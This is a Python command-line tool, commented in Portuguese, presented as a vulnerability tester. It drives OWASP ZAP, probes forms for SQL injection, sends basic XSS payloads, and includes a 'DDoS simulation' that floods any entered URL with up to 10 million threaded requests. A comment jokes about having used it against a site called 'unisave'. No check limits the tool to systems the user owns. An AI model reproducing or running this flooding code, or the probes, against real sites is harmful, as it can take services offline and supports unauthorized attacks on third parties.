from zapv2 import ZAPv2
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from models.geracao_dados import gerar_dados
from models.treinamento_modelo import treinar_modelo
import os
from fpdf import FPDF
import threading
import time


# Função para criar o relatório PDF
def criar_relatorio_pdf(nome_site, resultados):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    pdf.cell(200, 10, txt="Relatório de Vulnerabilidades", ln=True, align="C")
    pdf.ln(10)
    pdf.cell(200, 10, txt=f"Relatório para o site: {nome_site}", ln=True, align="L")
    pdf.ln(10)
    
    for resultado in resultados:
        pdf.multi_cell(0, 10, txt=resultado)
        pdf.ln(5)
    
    relatorio_path = os.path.join('reports', f'relatorio_de_{nome_site}.pdf')
    pdf.output(relatorio_path)
    print(f"Relatório salvo como {relatorio_path}")

# Função para pegar formulários do site
def get_forms(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao acessar o URL: {e}")
        return []

def form_details(form):
    details_of_form = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value,
        })
    
    details_of_form['action'] = action
    details_of_form['method'] = method
    details_of_form['inputs'] = inputs

    return details_of_form

# Função para executar testes de SQL Injection
def sql_injection_scan(url):
    forms = get_forms(url)
    resultados = []
    if not forms:
        resultados.append("Nenhum formulário encontrado para SQL Injection.")
        return resultados

    for form in forms:
        details = form_details(form)
        inputs = details["inputs"]
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        form_url = urljoin(url, action) if action else url

        data = {input_tag.get("name"): "Test'" for input_tag in form.find_all("input") if input_tag.get("name")}
        try:
            res = requests.post(form_url, data=data) if method == "post" else requests.get(form_url, params=data)
            if "syntax" in res.text.lower():
                resultados.append(f"[!] Vulnerabilidade de SQL Injection detectada em {form_url}")
        except requests.exceptions.RequestException as e:
            resultados.append(f"Erro ao testar SQL Injection: {e}")
    
    return resultados

# Função para executar testes de XSS
def xss_scan(url):
    resultados = []
    # Teste XSS básico
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<a href='javascript:alert(1)'>click me</a>"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url, params={"test": payload})
            if payload in response.text:
                resultados.append(f"[!] Vulnerabilidade de XSS detectada com o payload: {payload}")
        except requests.exceptions.RequestException as e:
            resultados.append(f"Erro ao testar XSS: {e}")

    if not resultados:
        resultados.append("Nenhuma vulnerabilidade XSS detectada.")
    
    return resultados

# Função para executar ataque DDoS simulado
def ddos_attack_simulation(url, num_requests=10000000, delay=0):
    #sugiro que mudes o numero de requisicoes kkkk coloquei 10milhoes porque estava a testar unisave kkk
    print(f"Simulando ataque DDoS em {url} com {num_requests} requisições...")
    def send_request():
        try:
            response = requests.get(url)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao realizar requisição DDoS: {e}")
    
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()
        time.sleep(delay)  # Controlar o tempo entre as requisições

    for thread in threads:
        thread.join()

    print("Simulação de ataque DDoS concluída.")

# Atualizando a função principal de execução de testes
def executar_testes():
    print("\n\t\t============== Agente de Teste de Vulnerabilidades ==============")
    print("\n\n\t\t=================== Seja Bem Vindo ==================")
    print("\nO presente programa visa auxiliar os seus usuários a realizarem testes de vulnerabilidades nos seus sites ou sistemas")
    
    zap_ip = input("Insira o IP da ZAP: ").strip()
    zap_api_key = input("Insira a API da ZAP: ").strip()
    zap = ZAPv2(apikey=zap_api_key, proxies={'http': f'http://{zap_ip}:8080'})

    print("\nEscolha o tipo de teste a ser realizado:")
    print("\n\t1 - SQL Injection\n\t2 - XSS\n\t3 - DDoS\n\t4 - Todos os ataques")
    choice = input("Escolha a opção: ").strip()

    if choice == "1":
        url = input("Insira o URL para teste de vulnerabilidades: ").strip()
        print("Treinando o modelo...")
        treinar_modelo()
        print("Gerando dados...")
        gerar_dados()
        print('Iniciando varredura ativa...')
        zap.ascan.scan(url)
        print('Varredura ativa iniciada.')
        sql_injection_scan(url)
    elif choice == "2":
        url = input("Insira o URL para teste de vulnerabilidades: ").strip()
        xss_scan(url)
    elif choice == "3":
        url = input("Insira o URL para o teste de DDoS: ").strip()
        ddos_attack_simulation(url)
    elif choice == "4":
        url = input("Insira o URL para teste de vulnerabilidades: ").strip()
        print("Executando todos os ataques...")
        print('Iniciando varredura ativa...')
        zap.ascan.scan(url)
        print('Varredura ativa iniciada.')
        sql_injection_scan(url)
        xss_scan(url)
        ddos_attack_simulation(url)
    else:
        print("Opção inválida! Por favor, escolha uma opção válida.")